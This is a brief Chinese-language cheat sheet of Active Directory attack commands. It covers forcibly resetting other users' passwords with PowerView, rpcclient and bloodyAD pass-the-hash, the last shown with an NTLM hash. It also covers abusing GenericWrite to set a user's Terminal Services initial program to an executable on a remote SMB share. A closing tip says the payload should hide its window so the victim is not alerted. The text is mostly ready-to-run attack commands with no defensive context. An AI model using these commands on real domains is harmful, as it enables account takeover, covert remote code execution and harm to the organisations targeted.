	重置其他用户的密码
	Windows 上
	https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1
	$user = 'DOMAIN\user1'; 
	$pass= ConvertTo-SecureString 'user1pwd' -AsPlainText -Force; 
	$creds = New-Object System.Management.Automation.PSCredential $user, $pass;
	$newpass = ConvertTo-SecureString 'newsecretpass' -AsPlainText -Force; 
	Set-DomainUserPassword -Identity 'DOMAIN\user2' -AccountPassword $newpass -Credential $creds;
	Linux 上
	使用 Samba 软件套件中的 rpcclient
	>rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
	使用bloodyAD来pass-the-hash
	>bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd
  #### GenericWrite和远程连接管理器
	https://sensepost.com/blog/2020/ace-to-rce/
	RCM 仅在终端服务器/远程桌面会话主机上处于活动状态。RCM 在最新版本的 Windows (>2016) 上也被禁用，它需要更改注册表才能重新启用。
	$UserObject = ([ADSI]("LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld"))
	$UserObject.TerminalServicesInitialProgram = "\\1.2.3.4\share\file.exe"
	$UserObject.TerminalServicesWorkDirectory = "C:\"
	$UserObject.SetInfo()
	为了不提醒用户，payload 应该隐藏自己的进程窗口并生成正常的图形环境